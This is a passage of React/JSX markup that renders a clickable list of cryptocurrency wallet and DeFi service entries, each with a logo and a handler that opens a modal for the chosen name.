              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Bitkeep</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={bitkeep}
                alt="BitKeep wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('ViaWallet')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">ViaWallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={viawallet}
                alt="Via wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('SparkPoint')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">SparkPoint</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={sparkpoint}
                alt="SparkPoint wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('HaloDefi')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">HaloDefi</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={halodefi}
                alt="HaloDefi wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Dok')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Dok Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dok}
                alt="Dok wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('AT Wallet')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">AT.Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={at}
                alt="AT.Wallet wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Midas')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Midas Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={midas}
                alt="Midas wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('KeyRingPro')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">KEYRING PRO</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={ellipal}
                alt="ellipoal wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Aktoinariat')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Aktionariat</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={aktionariat}
                alt="aktonariat wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Talken')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Talken</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={talken}
                alt="Talken wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>


          <div onClick={() => this.showModalFunc('Flare')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Flare Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={flares}
                alt="Flare wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('AToken')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">AToken Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={atoken}
                alt="Atoken wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Tongue')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Tongue Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={tongue}
                alt="Tongue wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Binance DEX')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Binance DEX</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={binance}
                alt="Binance wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('RWallet')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">RWallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={rwallet}
                alt="RWallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('PlasmaPay')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">PlasmaPay</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={plasmapay}
                alt="PlasmaPay"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('O3Wallet')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">O3Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={O3wallet}
                alt="O3Wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('HashKey')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">HashKey Me</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={hashkey}
                alt="HashKey Me"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('JadeWallet')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Jade Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={jadewallet}
                alt="JadeWallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Guarda')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Guarda Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={guardwallet}
                alt="guardwallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Defiant')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Defiant</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={defiant}
                alt="Defiant"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Trustee')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Trustee Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={trustee}
                alt="Defiant"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('MeetOne')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">MEET.ONE</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={meetone}
                alt="Defiant"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Morix')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">MoriX Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={morix}
                alt="Morix"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Binance Smart Chain')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Binance Smart Chain</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={binance}
                alt="Binance"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Etherscan')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Etherscan</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={etherscan}
                alt="Etherscan"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Lido')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Lido</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={lido}
                alt="Lido"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Terrastation')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">TERRAstation</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={terrastation}
                alt="Terrastation"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('OpenSea')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Opensea</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={opensea}
                alt="Opensea"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Zapper')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Zapper</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={zapper}
                alt="Zapper"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Aave')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Aave</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={aave}
                alt="Aave"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Zerion')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
